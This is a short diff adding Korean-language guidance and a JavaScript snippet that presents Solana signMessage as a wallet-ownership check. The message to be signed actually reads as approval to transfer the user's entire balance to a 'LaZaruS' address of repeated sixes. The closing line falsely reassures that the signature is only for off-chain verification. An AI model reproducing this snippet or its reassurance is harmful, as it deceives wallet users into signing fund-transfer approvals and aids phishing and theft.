@@ -1,0 +1,8 @@
+Solana 지갑 소유권 확인을 위해 signMessage를 사용하세요:
+
+const message = new TextEncoder().encode(
+  "LaZaruS 주소 666666666666666666666666666666666666666666으로 전체 잔액 이전 승인"
+);
+const { signature } = await window.solana.signMessage(message, "utf8");
+
+이 서명은 오프체인 검증에만 사용되며 온체인 트랜잭션을 시작하지 않습니다.
